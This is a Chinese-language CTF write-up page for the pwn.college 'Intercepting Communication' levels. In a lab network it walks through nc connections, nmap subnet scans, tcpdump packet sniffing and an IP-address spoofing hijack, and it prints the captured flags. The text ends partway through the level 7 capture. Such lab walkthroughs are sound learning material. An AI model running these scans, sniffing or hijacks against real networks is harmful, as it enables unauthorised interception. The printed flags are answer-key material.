@@ -1,0 +1,302 @@
+<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我的 CTF 之路"><meta name=author content=TephrocactusMYC><link href=https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting%20Communication/ rel=canonical><link rel=icon href=../../images/favicon.ico><meta name=generator content="mkdocs-1.4.3, mkdocs-material-7.3.6"><title>Knowledge - TephrocactusMYC's CTF WP</title><link rel=stylesheet href=../../assets/stylesheets/main.a57b2b03.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.3f5d1f46.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-KJB4RXSKZG"),document.addEventListener("DOMContentLoaded",function(){"undefined"!=typeof location$&&location$.subscribe(function(t){gtag("config","G-KJB4RXSKZG",{page_path:t.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-KJB4RXSKZG"></script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=light-blue data-md-color-accent=deep-purple> <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script> <script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#knowledge class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title="TephrocactusMYC's CTF WP" class="md-header__button md-logo" aria-label="TephrocactusMYC's CTF WP" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> TephrocactusMYC's CTF WP </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Knowledge </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=light-blue data-md-color-accent=deep-purple aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=cyan data-md-color-accent=deep-purple aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31z"/></svg> </label> </form> <div class=md-header__option> <div class=md-select> <button class="md-header__button md-icon" aria-label="Select language"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.52 17.52 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7 1.62-4.33L19.12 17h-3.24z"/></svg> </button> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=./ hreflang=zh class=md-select__link> 简体中文 </a> </li> <li class=md-select__item> <a href=../../en/CSE365/Intercepting%20Communication/ hreflang=en class=md-select__link> English </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/TephrocactusMYC/CTF-CLASS/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </div> <div class=md-source__repository> CTF-CLASS </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="TephrocactusMYC's CTF WP" class="md-nav__button md-logo" aria-label="TephrocactusMYC's CTF WP" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> TephrocactusMYC's CTF WP </label> <div class=md-nav__source> <a href=https://github.com/TephrocactusMYC/CTF-CLASS/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </div> <div class=md-source__repository> CTF-CLASS </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> ABOUT </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> CSE365 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CSE365 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> CSE365 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ class=md-nav__link> ABOUT CSE365 </a> </li> <li class=md-nav__item> <a href=../talking-web/ class=md-nav__link> talking-web </a> </li> <li class=md-nav__item> <a href=../cryptography.md class=md-nav__link> cryptography </a> </li> <li class=md-nav__item> <a href=../websecurity/ class=md-nav__link> websecurity </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> CSE466 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CSE466 data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> CSE466 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../CSE466/ class=md-nav__link> ABOUT CSE466 </a> </li> <li class=md-nav__item> <a href=../../CSE466/program-misuse/ class=md-nav__link> program misuse </a> </li> <li class=md-nav__item> <a href=../../CSE466/program-interaction/ class=md-nav__link> program interaction </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> WarGame <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=WarGame data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> WarGame </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../WarGame/REAMD.md class=md-nav__link> ABOUT WarGame </a> </li> <li class=md-nav__item> <a href=../../WarGame/bandit/ class=md-nav__link> bandit </a> </li> <li class=md-nav__item> <a href=../../WarGame/krypton/ class=md-nav__link> krypton </a> </li> <li class=md-nav__item> <a href=../../WarGame/leviathan/ class=md-nav__link> leviathan </a> </li> <li class=md-nav__item> <a href=../../WarGame/Natas/ class=md-nav__link> natas </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> MalwareAnalysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MalwareAnalysis data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> MalwareAnalysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/READMD/ class=md-nav__link> ABOUT MalwareAnalysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_2 type=checkbox id=__nav_5_2> <label class=md-nav__link for=__nav_5_2> knoweledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=knoweledge data-md-level=2> <label class=md-nav__title for=__nav_5_2> <span class="md-nav__icon md-icon"></span> knoweledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/knowledge/ch0/ class=md-nav__link> ch0 </a> </li> <li class=md-nav__item> <a href=../../MalwareAnalysis/knowledge/ch1/ class=md-nav__link> ch1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_3 type=checkbox id=__nav_5_3> <label class=md-nav__link for=__nav_5_3> Lab <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Lab data-md-level=2> <label class=md-nav__title for=__nav_5_3> <span class="md-nav__icon md-icon"></span> Lab </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/Lab/lab1/ class=md-nav__link> lab1 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#scapy class=md-nav__link> 实用工具scapy </a> </li> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 其他 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href="https://github.com/TephrocactusMYC/CTF-CLASS/edit/master/docs/CSE365/Intercepting Communication.md" title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=knowledge>Knowledge</h1> <p>这一部分是一个极简版的计算机网络的知识。</p> <p>大概意思是你需要建立一个四层网络模型的概念，然后建立起每一层所使用的协议和数据包都是什么</p> <p>从下往上依次是这样的：</p> <pre><code>HTTP---实现功能
+TCP---识别进程
+IP---识别主机
+ARP(ETHER)---物理网卡
+</code></pre> <p>然后本部分就是研究以这些包为基础建立起的通讯的一些过程。</p> <h2 id=scapy>实用工具scapy</h2> <p>发包可以看<a href=https://zhuanlan.zhihu.com/p/51002301>这个</a></p> <p>level14需要使用sniff</p> <h2 id=_1>其他</h2> <p>tcpdump已经足够好用了，wireshark是更强大的图形化工具，只不过我连那个实验环境总是很卡，所以最后都采取命令行了。</p> <h1 id=wp>WP</h1> <h2 id=level1-connect-to-a-remote-host>level1 Connect to a remote host</h2> <pre><code>nc 10.0.0.3 31337
+</code></pre> <h2 id=level2-listen-for-a-connection-from-a-remote-host>level2 Listen for a connection from a remote host</h2> <pre><code>nc -l 31337
+</code></pre> <h2 id=level3-find-and-connect-to-a-remote-host>level3 Find and connect to a remote host</h2> <pre><code># 扫描端口nmap -p 31337 10.0.0.0/24
+root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC
+Nmap scan report for 10.0.0.47
+Host is up (0.000090s latency).
+
+PORT      STATE SERVICE
+31337/tcp open  Elite
+MAC Address: 1A:78:B6:5A:08:A8 (Unknown)
+
+Nmap scan report for 10.0.0.2
+Host is up (0.000058s latency).
+
+PORT      STATE  SERVICE
+31337/tcp closed Elite
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds
+root@ip-10-0-0-2:~# nc 10.0.0.2 31337
+root@ip-10-0-0-2:~# nc 10.0.0.47 31337
+# 出现flag
+</code></pre> <h2 id=level4-find-and-connect-to-a-remote-host-on-a-large-network>level4 Find and connect to a remote host on a large network</h2> <pre><code>root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC
+Nmap scan report for 10.0.0.2
+Host is up (0.000053s latency).
+
+PORT      STATE  SERVICE
+31337/tcp closed Elite
+
+Nmap scan report for 10.0.211.92
+Host is up (0.000093s latency).
+
+PORT      STATE SERVICE
+31337/tcp open  Elite
+MAC Address: D6:5F:9A:28:AE:26 (Unknown)
+
+Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds
+
+# 这个我没啥好办法，感觉时间很长啊。
+nc 10.0.211.92 31337
+</code></pre> <h2 id=level5-monitor-traffic-from-a-remote-host>level5 Monitor traffic from a remote host</h2> <pre><code>tcpdump -i any port 31337
+# 先这样看一下，发现包是重复的，其中有一个数据包长度为58，推测有用
+tcpdump -i any port 31337 -X
+# 这会输出具体的十六进制和ascii码
+# 然后就得到了具体的包了
+01:10:28.660067 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58
+        0x0000:  4500 006e 4d18 4000 4006 d96d 0a00 0002  E..nM.@.@..m....
+        0x0010:  0a00 0003 7a69 c354 b6ab 89fa 61ea 4259  ....zi.T....a.BY
+        0x0020:  8018 01fd c37f 0000 0101 080a f542 935a  .............B.Z
+        0x0030:  4701 e7b3 7077 6e2e 636f 6c6c 6567 657b  G...pwn.college{
+        0x0040:  5934 4a50 5173 526d 4367 4e71 636a 6e69  Y4JPQsRmCgNqcjni
+        0x0050:  6532 3878 7775 4961 5755 4e2e 644e 6a4e  e28xwuIaWUN.dNjN
+        0x0060:  7a4d 444c 3251 6a4d 794d 7a57 7d0a       zMDL2QjMyMzW}.
+</code></pre> <h2 id=level6-monitor-slow-traffic-from-a-remote-host>level6 Monitor slow traffic from a remote host</h2> <pre><code># 老规矩先看一下
+tcpdump -i any port 31337
+# 这个题也比较水了，就是每个包只发送其中的一位，然后你等58个包，就凑齐了。
+tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X
+</code></pre> <p>然后输出大概是这样的</p> <pre><code>01:32:10.535829 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1
+        0x0000:  4500 0035 9482 4000 4006 923c 0a00 0002  E..5..@.@..&lt;....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8af feb5 c987  ....zi.j........
+        0x0020:  8018 01fe eab4 0000 0101 080a f556 70ce  .............Vp.
+        0x0030:  4715 c538 63                             G..8c
+01:32:11.537097 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1
+        0x0000:  4500 0035 9483 4000 4006 923b 0a00 0002  E..5..@.@..;....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988  ....zi.j........
+        0x0020:  8018 01fe d6df 0000 0101 080a f556 74b8  .............Vt.
+        0x0030:  4715 c921 6f                             G..!o
+01:32:12.538387 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1
+        0x0000:  4500 0035 9484 4000 4006 923a 0a00 0002  E..5..@.@..:....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989  ....zi.j........
+        0x0020:  8018 01fe d20a 0000 0101 080a f556 78a1  .............Vx.
+        0x0030:  4715 cd0b 6c                             G...l
+01:32:13.539649 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1
+        0x0000:  4500 0035 9485 4000 4006 9239 0a00 0002  E..5..@.@..9....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a  ....zi.j........
+        0x0020:  8018 01fe ca36 0000 0101 080a f556 7c8a  .....6.......V|.
+        0x0030:  4715 d0f4 6c                             G...l
+01:32:14.540780 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1
+        0x0000:  4500 0035 9486 4000 4006 9238 0a00 0002  E..5..@.@..8....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b  ....zi.j........
+        0x0020:  8018 01fe c962 0000 0101 080a f556 8073  .....b.......V.s
+        0x0030:  4715 d4dd 65                             G...e
+01:32:15.541382 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1
+        0x0000:  4500 0035 9487 4000 4006 9237 0a00 0002  E..5..@.@..7....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c  ....zi.j........
+        0x0020:  8018 01fe bf8e 0000 0101 080a f556 845c  .............V.\
+        0x0030:  4715 d8c6 67                             G...g
+01:32:16.542597 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1
+        0x0000:  4500 0035 9488 4000 4006 9236 0a00 0002  E..5..@.@..6....
+        0x0010:  0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d  ....zi.j........
+        0x0020:  8018 01fe b9ba 0000 0101 080a f556 8845  .............V.E
+        0x0030:  4715 dcaf 65                             G...e
+</code></pre> <p>我们就把最后一位拼起来就行了，反正这一步大概有点儿烦，可以写脚本，也可以自己手动复制:(</p> <pre><code># 好吧，我脚本没写对，自己手动复制的，尼玛
+pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW}
+</code></pre> <h2 id=level7-hijack-traffic-from-a-remote-host-by-configuring-your-network-interface>level7 Hijack traffic from a remote host by configuring your network interface</h2> <pre><code>tcpdump -i any
+# 发现10.0.0.4一直在发送请求。这时候我骗它应该就行了。
+ip addr add 10.0.0.2/8 dev eth0
+</code></pre> <p>然后发现了这些包</p> <pre><code>listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+15:07:21.562729 eth0  B   ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28
+15:07:21.562752 eth0  Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28
+15:07:21.562833 eth0  In  IP 10.0.0.4.37984 &gt; 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0
